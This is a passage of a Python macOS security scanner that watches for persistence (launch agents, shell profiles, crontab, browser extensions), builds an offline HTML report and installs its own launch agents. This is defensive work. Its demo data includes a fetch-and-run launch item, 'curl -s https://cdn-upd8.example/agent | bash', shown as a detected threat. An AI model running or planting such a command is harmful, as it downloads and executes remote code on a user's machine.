# 5. Persistence watchdog (bonus module)
# ---------------------------------------------------------------------------
def collect_persistence(findings, status, rebaseline=False):
    baseline = load_json(BASELINE_FILE, None)
    created = baseline is None or rebaseline
    current = {"launch": {}, "shell": {}, "ext": {}, "cron": ""}

    # Launch agents / daemons
    launch_items = []
    for scope, d in [("user", os.path.join(HOME, "Library/LaunchAgents")),
                     ("system agent", "/Library/LaunchAgents"), ("system daemon", "/Library/LaunchDaemons")]:
        for p in sorted(glob.glob(os.path.join(d, "*.plist"))):
            label, program = os.path.basename(p)[:-6], ""
            try:
                with open(p, "rb") as fh:
                    pl = plistlib.load(fh)
                label = pl.get("Label", label)
                args = pl.get("ProgramArguments") or []
                program = pl.get("Program") or " ".join(str(a) for a in args)
            except Exception:
                program = "(unreadable)"
            try:
                digest = sha256_file(p)
            except OSError:
                digest = ""
            current["launch"][p] = digest
            launch_items.append({"file": shorten_home(p), "path": p, "label": label, "program": program[:300], "scope": scope, "digest": digest})

    # Shell profiles
    shell_files = []
    for fn in [".zshrc", ".zprofile", ".zshenv", ".zlogin", ".bash_profile", ".bashrc", ".profile"]:
        p = os.path.join(HOME, fn)
        if not os.path.isfile(p):
            continue
        try:
            digest = sha256_file(p)
            with open(p, errors="replace") as fh:
                text = fh.read()
        except OSError:
            continue
        current["shell"][p] = digest
        sus = []
        for pat, why in SHELL_PATTERNS:
            for m in re.finditer(pat, text, re.I):
                line = text[text.rfind("\n", 0, m.start()) + 1: text.find("\n", m.end()) if text.find("\n", m.end()) != -1 else None]
                sus.append({"why": why, "line": line.strip()[:200]})
        shell_files.append({"file": "~/" + fn, "path": p, "digest": digest, "suspicious": sus})

    # Crontab
    rc, out, _ = run(["crontab", "-l"])
    cron_lines = [l for l in out.splitlines() if l.strip() and not l.strip().startswith("#")] if rc == 0 else []
    current["cron"] = "\n".join(cron_lines)

    # Browser extensions
    extensions = collect_extensions()
    for e in extensions:
        current["ext"]["%s|%s" % (e["browser"], e["id"])] = e["version"]

    if created:
        baseline = current
        save_json(BASELINE_FILE, {"created": now().strftime("%Y-%m-%d"), **current})
        baseline = load_json(BASELINE_FILE, {})
    b_launch, b_shell, b_ext = baseline.get("launch", {}), baseline.get("shell", {}), baseline.get("ext", {})
    changes = 0

    for it in launch_items:
        p = it.pop("path")
        digest = it.pop("digest")
        if created:
            it["status"] = "baseline"
        elif p not in b_launch:
            it["status"] = "new"
        elif b_launch[p] != digest:
            it["status"] = "changed"
        else:
            it["status"] = "unchanged"
        sus = [why for pat, why in LAUNCH_SUSPICIOUS if re.search(pat, it["program"], re.I)]
        prog_path = it["program"].split(" ")[0] if it["program"] else ""
        if prog_path.startswith(SUSPICIOUS_PATH_PREFIXES):
            sus.append("Runs from a temporary or shared folder")
        if it["status"] in ("new", "changed"):
            changes += 1
            sev = "high" if (sus or it["scope"] != "user") else "medium"
            finding(findings, sev, "persistence", "%s launch item %s: %s" % (it["scope"].capitalize(), it["status"], it["label"]),
                    ("; ".join(sus) + ". " if sus else "") + "Runs automatically at login or boot. Confirm you installed it.",
                    it["program"] or it["file"])
        elif sus and it["scope"] == "user":
            finding(findings, "medium", "persistence", "Launch agent with risky behaviour: %s" % it["label"],
                    "; ".join(sus), it["program"])
    if not created:
        for p in b_launch:
            if p not in current["launch"]:
                changes += 1
                launch_items.append({"file": shorten_home(p), "label": os.path.basename(p)[:-6], "program": "", "scope": "removed", "status": "removed"})

    for sf in shell_files:
        p = sf.pop("path")
        digest = sf.pop("digest")
        sf["status"] = "baseline" if created else ("new" if p not in b_shell else ("changed" if b_shell[p] != digest else "unchanged"))
        if sf["status"] in ("new", "changed"):
            changes += 1
            finding(findings, "medium", "persistence", "Shell profile %s: %s" % (sf["status"], sf["file"]),
                    "Runs every time you open Terminal. Review what was added.", sf["file"])
        for s in sf["suspicious"]:
            finding(findings, "high", "persistence", "Suspicious line in %s" % sf["file"], s["why"], s["line"])

    if not created and current["cron"] != baseline.get("cron", ""):
        changes += 1
        finding(findings, "medium", "persistence", "Crontab changed", "Scheduled jobs were added or edited.", current["cron"][:200] or "(cleared)")

    for e in extensions:
        k = "%s|%s" % (e["browser"], e["id"])
        e["status"] = "baseline" if created else ("new" if k not in b_ext else ("changed" if b_ext[k] != e["version"] else "unchanged"))
        if e["status"] == "new":
            changes += 1
            finding(findings, "medium", "persistence", "New %s extension: %s" % (e["browser"], e["name"]),
                    "Extensions can read pages you visit, including passwords and webmail. Confirm you added it.", e["id"])

    order = {"new": 0, "changed": 1, "removed": 2, "baseline": 3, "unchanged": 4}
    launch_items.sort(key=lambda i: (order.get(i["status"], 9), i["scope"], i["label"]))
    extensions.sort(key=lambda i: (order.get(i["status"], 9), i["browser"], i["name"].lower()))
    status["persistence"] = {"state": "ok", "reason": "Baseline created today" if created else
                             "%d changes since %s" % (changes, baseline.get("created", "baseline"))}
    return {"launch_items": launch_items, "shell_files": shell_files, "crontab": cron_lines, "extensions": extensions,
            "changes_count": changes, "baseline_created": created, "baseline_date": baseline.get("created")}


CHROMIUM = {
    "Chrome": "Library/Application Support/Google/Chrome",
    "Brave": "Library/Application Support/BraveSoftware/Brave-Browser",
    "Edge": "Library/Application Support/Microsoft Edge",
    "Arc": "Library/Application Support/Arc/User Data",
}


def collect_extensions():
    out = []
    for browser, rel in CHROMIUM.items():
        root = os.path.join(HOME, rel)
        for prof in glob.glob(os.path.join(root, "*", "Extensions")):
            for ext_dir in glob.glob(os.path.join(prof, "*")):
                ext_id = os.path.basename(ext_dir)
                versions = sorted(glob.glob(os.path.join(ext_dir, "*")))
                if not versions:
                    continue
                vdir = versions[-1]
                name, version = ext_id, os.path.basename(vdir)
                try:
                    with open(os.path.join(vdir, "manifest.json"), errors="replace") as fh:
                        mf = json.load(fh)
                    version = mf.get("version", version)
                    name = resolve_msg(mf.get("name", ext_id), vdir, mf.get("default_locale", "en"))
                except Exception:
                    pass
                if ext_id in ("Temp",):
                    continue
                out.append({"browser": browser, "id": ext_id, "name": name, "version": version})
    for ej in glob.glob(os.path.join(HOME, "Library/Application Support/Firefox/Profiles/*/extensions.json")):
        try:
            with open(ej) as fh:
                data = json.load(fh)
            for a in data.get("addons", []):
                if a.get("location") != "app-profile":
                    continue
                out.append({"browser": "Firefox", "id": a.get("id", ""), "name": (a.get("defaultLocale") or {}).get("name") or a.get("id", ""),
                            "version": a.get("version", "")})
        except Exception:
            continue
    # de-duplicate across profiles
    seen, uniq = set(), []
    for e in out:
        k = (e["browser"], e["id"])
        if k not in seen:
            seen.add(k)
            uniq.append(e)
    return uniq


def resolve_msg(name, vdir, locale):
    if not str(name).startswith("__MSG_"):
        return name
    key = name[6:-2]
    for loc in (locale, "en", "en_US"):
        try:
            with open(os.path.join(vdir, "_locales", loc, "messages.json"), errors="replace") as fh:
                msgs = json.load(fh)
            for k, v in msgs.items():
                if k.lower() == key.lower():
                    return v.get("message", name)
        except Exception:
            continue
    return name


# ---------------------------------------------------------------------------
# report assembly
# ---------------------------------------------------------------------------
def build_report(rebaseline=False):
    findings, status = [], {}
    report = {"meta": {
        "generated_at": iso(now()), "hostname": socket.gethostname().replace(".local", ""),
        "user": os.environ.get("USER", ""), "macos_version": platform.mac_ver()[0] or platform.platform(),
        "window_hours": WINDOW_HOURS, "collector_version": VERSION, "demo": False}}
    for key, fn in [("network", collect_network), ("littlesnitch", collect_littlesnitch),
                    ("gatekeeper", collect_gatekeeper), ("malwarebytes", collect_malwarebytes)]:
        try:
            report[key] = fn(findings, status)
        except Exception as exc:
            report[key] = {}
            status[key] = {"state": "unavailable", "reason": "Collector error: %s" % exc}
    try:
        report["persistence"] = collect_persistence(findings, status, rebaseline=rebaseline)
    except Exception as exc:
        report["persistence"] = {}
        status["persistence"] = {"state": "unavailable", "reason": "Collector error: %s" % exc}
    report["findings"] = findings
    report["module_status"] = status
    report["history"] = update_history(findings)
    return report


def update_history(findings):
    hist = load_json(HISTORY_FILE, [])
    today = now().strftime("%Y-%m-%d")
    entry = {"date": today, "high": 0, "medium": 0, "low": 0}
    for f in findings:
        if f["severity"] in entry:
            entry[f["severity"]] += 1
    hist = [h for h in hist if h.get("date") != today] + [entry]
    hist = hist[-60:]
    save_json(HISTORY_FILE, hist)
    return hist


def render_html(report):
    data = json.dumps(report, default=str).replace("</", "<\\/")
    return TEMPLATE.replace("__REPORT_JSON__", data)


def write_report(report, out_path=None):
    os.makedirs(REPORT_DIR, exist_ok=True)
    html = render_html(report)
    if out_path is None:
        out_path = os.path.join(REPORT_DIR, "report-%s.html" % now().strftime("%Y-%m-%d"))
        latest = os.path.join(BASE_DIR, "latest.html")
        with open(latest, "w") as fh:
            fh.write(html)
        # keep 30 days of reports
        for old in sorted(glob.glob(os.path.join(REPORT_DIR, "report-*.html")))[:-30]:
            try:
                os.remove(old)
            except OSError:
                pass
    os.makedirs(os.path.dirname(os.path.abspath(out_path)), exist_ok=True)
    with open(out_path, "w") as fh:
        fh.write(html)
    return out_path


# ---------------------------------------------------------------------------
# LaunchAgent install (user-level: no admin needed)
# ---------------------------------------------------------------------------
AGENT_DIR = os.path.join(HOME, "Library/LaunchAgents")
LABEL_SAMPLE = "com.macsentinelsynthesisscanner.sample"
LABEL_REPORT = "com.macsentinelsynthesisscanner.report"


def install(report_hour=7, interval_min=15):
    script = os.path.abspath(__file__)
    py = sys.executable or "/usr/bin/python3"
    os.makedirs(AGENT_DIR, exist_ok=True)
    os.makedirs(STATE_DIR, exist_ok=True)
    agents = {
        LABEL_SAMPLE: {"Label": LABEL_SAMPLE, "ProgramArguments": [py, script, "sample"],
                       "StartInterval": interval_min * 60, "RunAtLoad": True,
                       "StandardErrorPath": os.path.join(STATE_DIR, "sample.err.log"), "ProcessType": "Background", "Nice": 10},
        LABEL_REPORT: {"Label": LABEL_REPORT, "ProgramArguments": [py, script, "report"],
                       "StartCalendarInterval": {"Hour": report_hour, "Minute": 0},
                       "StandardOutPath": os.path.join(STATE_DIR, "report.out.log"),
                       "StandardErrorPath": os.path.join(STATE_DIR, "report.err.log"), "ProcessType": "Background", "Nice": 10},
    }
    uid = os.getuid()
    for label, pl in agents.items():
        path = os.path.join(AGENT_DIR, label + ".plist")
        run(["launchctl", "bootout", "gui/%d/%s" % (uid, label)])
        with open(path, "wb") as fh:
            plistlib.dump(pl, fh)
        rc, out, err = run(["launchctl", "bootstrap", "gui/%d" % uid, path])
        if rc != 0:
            run(["launchctl", "load", "-w", path])
        print("Installed %s" % shorten_home(path))
    print("\nSampler runs every %d minutes; report is written daily at %02d:00 to %s" % (interval_min, report_hour, shorten_home(os.path.join(BASE_DIR, "latest.html"))))
    print("Tip: Mac Sentinel Synthesis Scanner's own launch agents will show as 'new' once. Run `rebaseline` after installing.")


def uninstall():
    uid = os.getuid()
    for label in (LABEL_SAMPLE, LABEL_REPORT):
        path = os.path.join(AGENT_DIR, label + ".plist")
        run(["launchctl", "bootout", "gui/%d/%s" % (uid, label)])
        if os.path.exists(path):
            os.remove(path)
            print("Removed %s" % shorten_home(path))


# ---------------------------------------------------------------------------
# demo data
# ---------------------------------------------------------------------------
def demo_report():
    t = now().replace(second=0, microsecond=0)
    ts = lambda h=0, m=0: iso(t - dt.timedelta(hours=h, minutes=m))
    findings = [
        {"severity": "high", "module": "persistence", "title": "User launch item new: com.update.helper",
         "detail": "Runs an inline shell command; Downloads content at launch. Runs automatically at login or boot. Confirm you installed it.",
         "evidence": "/bin/bash -c curl -s https://cdn-upd8.example/agent | bash"},
        {"severity": "high", "module": "gatekeeper", "title": "Quarantine flag removed from a downloaded app",
         "detail": "It came from the internet but Gatekeeper's quarantine mark is gone. Malware installers often do this.",
         "evidence": "~/Downloads/VideoPlayerPro.app ← https://free-codecs.example/dl"},
        {"severity": "medium", "module": "persistence", "title": "New Chrome extension: PDF Converter Plus",
         "detail": "Extensions can read pages you visit, including passwords and webmail. Confirm you added it.", "evidence": "kbfnbcaeplbcioakkpcpgfkobkghlhen"},
        {"severity": "medium", "module": "network", "title": "Python accepts connections from the network",
         "detail": "Listening on all interfaces. Fine for AirPlay or dev servers you started; otherwise investigate.", "evidence": "*:8501"},
        {"severity": "medium", "module": "gatekeeper", "title": "Unsigned app in ~/Downloads",
         "detail": "No developer signature. Only run it if you trust where it came from.", "evidence": "~/Downloads/VideoPlayerPro.app"},
        {"severity": "low", "module": "network", "title": "Steam used uncommon port 27036",
         "detail": "Often legitimate (games, VPNs, dev tools). Confirm you recognise it.", "evidence": "162.254.193.6:27036"},
        {"severity": "low", "module": "littlesnitch", "title": "Host firewall blocked 14 connection events",
         "detail": "Blocks are normal. A sudden spike can mean a background process keeps retrying.", "evidence": "14 deny events"},
        {"severity": "low", "module": "network", "title": "VideoPlayerPro went online for the first time",
         "detail": "New since Mac Sentinel Synthesis Scanner started watching. Expected after installing apps.", "evidence": "VideoPlayerPro"},
    ]
    conns = [
        ("Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "142.250.72.14", 443, "TCP", 96, []),
        ("Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "104.18.32.47", 443, "TCP", 61, []),
        ("Dropbox", "/Applications/Dropbox.app/Contents/MacOS/Dropbox", "162.125.6.20", 443, "TCP", 96, []),
        ("Slack", "/Applications/Slack.app/Contents/MacOS/Slack", "3.33.152.147", 443, "TCP", 88, []),
        ("Mail", "/System/Applications/Mail.app/Contents/MacOS/Mail", "17.42.251.41", 993, "TCP", 72, []),
        ("VideoPlayerPro", "~/Downloads/VideoPlayerPro.app/Contents/MacOS/VideoPlayerPro", "185.220.101.34", 443, "TCP", 9, ["First time online", "Odd binary path"]),
        ("Steam", "~/Applications/Steam.app/Contents/MacOS/steam_osx", "162.254.193.6", 27036, "TCP", 14, ["Unusual port"]),
        ("apsd", "/System/Library/PrivateFrameworks/ApplePushService.framework/apsd", "17.57.146.52", 5223, "TCP", 96, []),
        ("Spotify", "/Applications/Spotify.app/Contents/MacOS/Spotify", "35.186.224.25", 443, "TCP", 40, []),
        ("zoom.us", "/Applications/zoom.us.app/Contents/MacOS/zoom.us", "170.114.52.2", 8801, "UDP", 6, ["Unusual port"]),
        ("python3", "/usr/bin/python3", "151.101.0.223", 443, "TCP", 3, []),
        ("mDNSResponder", "/usr/sbin/mDNSResponder", "1.1.1.1", 853, "TCP", 96, []),
    ]
    connections = [{"process": c[0], "path": c[1], "remote": c[2], "port": c[3], "proto": c[4], "count": c[5],
                    "first_seen": ts(23, 45), "last_seen": ts(0, (i * 7) % 50), "flags": c[6]} for i, c in enumerate(conns)]
    # The VideoPlayerPro row has an odd path — make that a high finding too
    findings.insert(2, {"severity": "high", "module": "network", "title": "Network activity from a temporary or download folder",
                        "detail": "VideoPlayerPro is running from ~/Downloads/VideoPlayerPro.app. Malware often runs from these locations.",
                        "evidence": "185.220.101.34:443"})
    talkers = [("Dropbox", 1.4e9, 3.1e8), ("Google Chrome", 2.2e9, 1.9e8), ("Slack", 3.4e8, 4.2e7), ("Spotify", 6.1e8, 9.0e6),
               ("zoom.us", 4.4e8, 3.9e8), ("Mail", 1.2e8, 2.4e7), ("VideoPlayerPro", 2.1e6, 4.8e7), ("Steam", 9.5e7, 3.0e6)]
    events = [
        {"time": ts(0, 12), "process": "Little Snitch Network Extension", "message": "Denied connection: VideoPlayerPro → telemetry.free-codecs.example:443 (rule: Deny unknown)", "denied": True},
        {"time": ts(1, 3), "process": "Little Snitch Network Extension", "message": "Denied connection: Adobe Desktop Service → cc-api-data.adobe.io:443", "denied": True},
        {"time": ts(2, 40), "process": "Little Snitch Agent", "message": "Rule created: Allow Slack → *.slack.com, any port", "denied": False},
        {"time": ts(5, 18), "process": "LuLu Daemon", "message": "Blocklist match: ads.tracker.example (Hagezi Pro)", "denied": True},
        {"time": ts(9, 0), "process": "Little Snitch Daemon", "message": "Profile activated: Home", "denied": False},
    ]
    return {
        "meta": {"generated_at": iso(t), "hostname": "MacBook-Pro", "user": "alex", "macos_version": "26.0.1",
                 "window_hours": 24, "collector_version": VERSION, "demo": True},
        "findings": findings,
        "module_status": {
            "network": {"state": "ok", "reason": "96 samples via lsof + nettop (raw packet capture needs admin)"},
            "littlesnitch": {"state": "ok", "reason": "Active: Little Snitch, LuLu (214 log events)"},
            "gatekeeper": {"state": "partial", "reason": "Posture, quarantine and signatures checked; unified log needs admin, used diagnostic reports instead"},
            "malwarebytes": {"state": "partial", "reason": "Malwarebytes, BlockBlock, OverSight active; detailed logs are root-only"},
            "persistence": {"state": "ok", "reason": "4 changes since 2026-10-05"},
        },
        "history": [{"date": (t - dt.timedelta(days=13 - i)).strftime("%Y-%m-%d"),
                     "high": [0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 3][i],
                     "medium": [1, 0, 2, 1, 1, 0, 0, 1, 2, 0, 1, 0, 1, 3][i],
                     "low": [3, 2, 4, 2, 3, 2, 1, 2, 4, 3, 2, 2, 3, 3][i]} for i in range(14)],
        "network": {"samples": 96, "first_sample": ts(23, 45), "last_sample": ts(0, 0), "unique_processes": 31, "unique_remotes": 184,
                    "total_in": sum(x[1] for x in talkers), "total_out": sum(x[2] for x in talkers),
                    "top_talkers": [{"process": p, "bytes_in": int(i), "bytes_out": int(o)} for p, i, o in talkers],
                    "listening": [{"process": "python3", "address": "*:8501", "local_only": False},
                                  {"process": "ControlCenter", "address": "*:7000", "local_only": False},
                                  {"process": "node", "address": "127.0.0.1:5173", "local_only": True}],
                    "connections": connections},
        "littlesnitch": {"cli_available": True, "cli_path": "/Applications/Little Snitch.app/Contents/Components/littlesnitch",
                         "running": True, "version": "6.2",
                         "lulu": {"installed": True, "version": "2.8.0", "running": True},
                         "events": events, "denied_count": 14, "note": ""},
        "gatekeeper": {
            "posture": [
                {"name": "Gatekeeper", "value": "assessments enabled", "state": "ok"},
                {"name": "System Integrity Protection", "value": "enabled.", "state": "ok"},
                {"name": "FileVault", "value": "FileVault is On.", "state": "ok"},
                {"name": "macOS firewall", "value": "Firewall is enabled. (State = 1)", "state": "ok"},
                {"name": "XProtect definitions", "value": "v5321 · updated 2026-10-14", "state": "ok"},
            ],
            "xprotect_reports": [],
            "xprotect_log": [],
            "downloads": [
                {"name": "VideoPlayerPro.app", "path": "~/Downloads/VideoPlayerPro.app", "kind": "App", "executable": True, "quarantined": False,
                 "where_from": "https://free-codecs.example/dl", "signer": "", "verdict": "stripped", "modified": ts(3, 10)},
                {"name": "Firefox 144.0.dmg", "path": "~/Downloads/Firefox 144.0.dmg", "kind": "DMG", "executable": True, "quarantined": True,
                 "where_from": "https://download-installer.cdn.mozilla.net/", "signer": "Developer ID Application: Mozilla Corporation (43AQ936H96)", "verdict": "ok", "modified": ts(26)},
                {"name": "quarterly-budget.csv", "path": "~/Downloads/quarterly-budget.csv", "kind": "CSV", "executable": False, "quarantined": True,
                 "where_from": "https://docs.google.com/", "signer": "", "verdict": "document", "modified": ts(30)},
                {"name": "install-tools.sh", "path": "~/Downloads/install-tools.sh", "kind": "SH", "executable": True, "quarantined": True,
                 "where_from": "https://raw.githubusercontent.com/", "signer": "", "verdict": "unsigned", "modified": ts(52)},
                {"name": "Statement-Sept.pdf", "path": "~/Downloads/Statement-Sept.pdf", "kind": "PDF", "executable": False, "quarantined": True,
                 "where_from": "https://mail.google.com/", "signer": "", "verdict": "document", "modified": ts(80)},
            ]},
        "malwarebytes": {
            "installed": True, "version": "5.14.1",
            "tools": [
                {"name": "Malwarebytes", "installed": True, "running": True, "detail": "Running · v5.14.1"},
                {"name": "BlockBlock", "installed": True, "running": True, "detail": "Running · v2.2.5"},
                {"name": "OverSight", "installed": True, "running": True, "detail": "Running · v2.1.0"},
                {"name": "KnockKnock", "installed": True, "running": True, "detail": "Installed (v2.5.0) · On-demand"},
                {"name": "RansomWhere?", "installed": False, "running": False, "detail": "Not installed (optional)"},
                {"name": "ClamAV", "installed": False, "running": False, "detail": "Not installed (optional)"},
            ],
            "processes": [
                {"pid": 412, "name": "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"},
                {"pid": 618, "name": "/Applications/BlockBlock Helper.app/Contents/MacOS/BlockBlock Helper"},
                {"pid": 904, "name": "/Applications/OverSight.app/Contents/Library/LoginItems/OverSight Helper.app/Contents/MacOS/OverSight Helper"},
                {"pid": 1188, "name": "/Applications/Malwarebytes.app/Contents/Library/LoginItems/Malwarebytes Protection.app/Contents/MacOS/FrontendAgent"},
            ],
            "logs": [], "log_lines": []},
        "persistence": {
            "launch_items": [
                {"file": "~/Library/LaunchAgents/com.update.helper.plist", "label": "com.update.helper", "program": "/bin/bash -c curl -s https://cdn-upd8.example/agent | bash", "scope": "user", "status": "new"},
                {"file": "~/Library/LaunchAgents/com.google.keystone.agent.plist", "label": "com.google.keystone.agent", "program": "~/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent -runMode ifneeded", "scope": "user", "status": "unchanged"},
                {"file": "~/Library/LaunchAgents/com.macsentinelsynthesisscanner.sample.plist", "label": "com.macsentinelsynthesisscanner.sample", "program": "/usr/bin/python3 ~/MacSentinelSynthesisScanner/mac_sentinel_synthesis_scanner.py sample", "scope": "user", "status": "unchanged"},
                {"file": "/Library/LaunchDaemons/com.malwarebytes.mbam.rtprotection.daemon.plist", "label": "com.malwarebytes.mbam.rtprotection.daemon", "program": "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon", "scope": "system daemon", "status": "unchanged"},
                {"file": "/Library/LaunchDaemons/at.obdev.littlesnitchd.plist", "label": "at.obdev.littlesnitchd", "program": "/Library/Application Support/Objective Development/Little Snitch/littlesnitchd", "scope": "system daemon", "status": "unchanged"},
                {"file": "/Library/LaunchDaemons/com.objective-see.blockblock.plist", "label": "com.objective-see.blockblock", "program": "/Library/Objective-See/BlockBlock/BlockBlock Daemon.app/Contents/MacOS/BlockBlock Daemon", "scope": "system daemon", "status": "unchanged"},
            ],
            "shell_files": [{"file": "~/.zshrc", "status": "changed", "suspicious": []}, {"file": "~/.zprofile", "status": "unchanged", "suspicious": []}],
            "crontab": [],
            "extensions": [
                {"browser": "Chrome", "id": "kbfnbcaeplbcioakkpcpgfkobkghlhen", "name": "PDF Converter Plus", "version": "2.4.1", "status": "new"},
                {"browser": "Chrome", "id": "nngceckbapebfimnlniiiahkandclblb", "name": "Bitwarden Password Manager", "version": "2026.9.0", "status": "unchanged"},
                {"browser": "Chrome", "id": "cjpalhdlnbpafiamejdnhcphjbkeiagm", "name": "uBlock Origin", "version": "1.66.4", "status": "unchanged"},
                {"browser": "Firefox", "id": "addon@darkreader.org", "name": "Dark Reader", "version": "4.9.88", "status": "unchanged"},
            ],
            "changes_count": 4, "baseline_created": False, "baseline_date": "2026-10-05"},
    }


# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="Mac Sentinel Synthesis Scanner — non-admin macOS security report")
    sub = ap.add_subparsers(dest="cmd")
    sub.add_parser("sample")
    r = sub.add_parser("report")
    r.add_argument("--open", action="store_true", help="open the dashboard when done")
    r.add_argument("--out", help="write to this path instead of ~/MacSentinelSynthesisScanner/reports")
    i = sub.add_parser("install")
    i.add_argument("--hour", type=int, default=7)
    i.add_argument("--interval", type=int, default=15, help="minutes between network samples")
    sub.add_parser("uninstall")
    sub.add_parser("rebaseline")
    d = sub.add_parser("demo")
    d.add_argument("--out", default=os.path.join(BASE_DIR, "demo.html"))
    d.add_argument("--open", action="store_true")
    args = ap.parse_args()

    if args.cmd == "demo":
        path = write_report(demo_report(), args.out)
        print("Demo dashboard: %s" % path)
        if args.open:
            run(["open", path])
        return
    if sys.platform != "darwin":
        sys.exit("Mac Sentinel Synthesis Scanner only runs on macOS (use `demo` to preview the dashboard elsewhere).")
    if args.cmd == "sample":
        s = take_sample()
        print("Sampled %d connections" % len(s["conns"]))
    elif args.cmd in ("report", "rebaseline"):
        rep = build_report(rebaseline=args.cmd == "rebaseline")
        path = write_report(rep, getattr(args, "out", None))
        f = rep["findings"]
        print("Report: %s" % path)
        print("Findings: %d high, %d medium, %d low" % tuple(sum(1 for x in f if x["severity"] == s) for s in ("high", "medium", "low")))
        if getattr(args, "open", False):
            run(["open", path])
    elif args.cmd == "install":
        install(args.hour, args.interval)
    elif args.cmd == "uninstall":
        uninstall()
    else:
        ap.print_help()


TEMPLATE = r"""<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="referrer" content="no-referrer">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:;">
<title>Mac Sentinel Synthesis Scanner — Daily Security Report</title>
<style>
/* Mac Sentinel Synthesis Scanner uses only system fonts on purpose: the report
   makes zero network requests, so it never trips Little Snitch and works fully offline. */
:root {
  --font-body: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif;
  --font-mono: ui-monospace, "SF Mono", Menlo, Monaco, monospace;

  --text-xs: clamp(0.75rem, 0.7rem + 0.25vw, 0.875rem);
  --text-sm: clamp(0.875rem, 0.8rem + 0.35vw, 1rem);
  --text-base: clamp(1rem, 0.95rem + 0.25vw, 1.125rem);
  --text-lg: clamp(1.125rem, 1rem + 0.75vw, 1.5rem);
  --text-xl: clamp(1.5rem, 1.2rem + 1.25vw, 2.25rem);

  --space-1: 0.25rem; --space-2: 0.5rem; --space-3: 0.75rem; --space-4: 1rem;
  --space-5: 1.25rem; --space-6: 1.5rem; --space-8: 2rem; --space-10: 2.5rem; --space-12: 3rem;

  /* Graphite console palette */
  --color-bg: #0f1215;
  --color-surface: #151a1e;
  --color-surface-2: #1a2025;
  --color-surface-offset: #1f262c;
  --color-divider: #232b31;
  --color-border: #2e373e;
  --color-text: #d9dfe3;
  --color-text-muted: #8b979f;
  --color-text-faint: #5d6870;
  --color-primary: #5fc7b0;
  --color-primary-hover: #7fd8c4;
  --color-primary-highlight: #1d3631;

  --sev-high: #f2777a;      --sev-high-bg: #3a1f22;
  --sev-medium: #f0b25a;    --sev-medium-bg: #3a2d1b;
  --sev-low: #7fb2e5;       --sev-low-bg: #1c2b3a;
  --sev-info: #9aa5ad;      --sev-info-bg: #222a30;
  --ok: #6fcf8f;            --ok-bg: #1b3325;

  --radius-sm: 0.375rem; --radius-md: 0.5rem; --radius-lg: 0.75rem; --radius-full: 9999px;
  --transition-interactive: 180ms cubic-bezier(0.16, 1, 0.3, 1);
  --shadow-md: 0 4px 12px rgb(0 0 0 / 0.3);
}
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { -webkit-text-size-adjust: none; text-size-adjust: none; -webkit-font-smoothing: antialiased; }
body {
  min-height: 100dvh; line-height: 1.55; font-family: var(--font-body); font-size: var(--text-base);
  color: var(--color-text); background: var(--color-bg);
}
button { font: inherit; color: inherit; cursor: pointer; background: none; border: none; }
a, button { transition: color var(--transition-interactive), background var(--transition-interactive), border-color var(--transition-interactive); }
:focus-visible { outline: 2px solid var(--color-primary); outline-offset: 2px; border-radius: var(--radius-sm); }
table { border-collapse: collapse; width: 100%; }
h1, h2, h3 { line-height: 1.2; text-wrap: balance; }
p { text-wrap: pretty; max-width: 72ch; }
.num { font-variant-numeric: tabular-nums lining-nums; }
.mono { font-family: var(--font-mono); font-size: 0.92em; }
.muted { color: var(--color-text-muted); }
.faint { color: var(--color-text-faint); }
.sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; }

/* ---------- Layout ---------- */
.app { display: grid; grid-template-columns: 248px 1fr; min-height: 100dvh; }
.sidebar {
  position: sticky; top: 0; height: 100dvh; overflow-y: auto; overscroll-behavior: contain;
  background: var(--color-surface); border-right: 1px solid var(--color-divider);
  padding: var(--space-6) var(--space-4); display: flex; flex-direction: column; gap: var(--space-6);
}
.brand { display: flex; align-items: center; gap: var(--space-3); padding-inline: var(--space-2); }
.brand-mark { width: 28px; height: 28px; color: var(--color-primary); flex: none; }
.brand-name { font-weight: 700; font-size: var(--text-sm); letter-spacing: 0.01em; }
.brand-sub { font-size: var(--text-xs); color: var(--color-text-muted); }
.nav { display: flex; flex-direction: column; gap: var(--space-1); }
.nav-btn {
  display: flex; align-items: center; gap: var(--space-3); width: 100%; text-align: left;
  padding: var(--space-2) var(--space-3); border-radius: var(--radius-md);
  font-size: var(--text-sm); color: var(--color-text-muted);
}
.nav-btn svg { width: 18px; height: 18px; flex: none; }
.nav-btn:hover { background: var(--color-surface-offset); color: var(--color-text); }
.nav-btn[aria-selected="true"] { background: var(--color-primary-highlight); color: var(--color-text); }
.nav-btn[aria-selected="true"] svg { color: var(--color-primary); }
.nav-label { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.nav-badge { flex: none;
  font-size: var(--text-xs); font-variant-numeric: tabular-nums; min-width: 1.6em; text-align: center;
  padding: 0 var(--space-2); border-radius: var(--radius-full); line-height: 1.6;
}
.nav-badge.high { background: var(--sev-high-bg); color: var(--sev-high); }
.nav-badge.medium { background: var(--sev-medium-bg); color: var(--sev-medium); }
.sidebar-foot { margin-top: auto; font-size: var(--text-xs); color: var(--color-text-faint); padding-inline: var(--space-2); line-height: 1.5; }

.main { min-width: 0; }
.topbar {
  position: sticky; top: 0; z-index: 10; display: flex; align-items: center; justify-content: space-between;
  gap: var(--space-4); flex-wrap: wrap; padding: var(--space-4) var(--space-8);
  background: color-mix(in oklab, var(--color-bg) 88%, transparent); backdrop-filter: blur(8px);
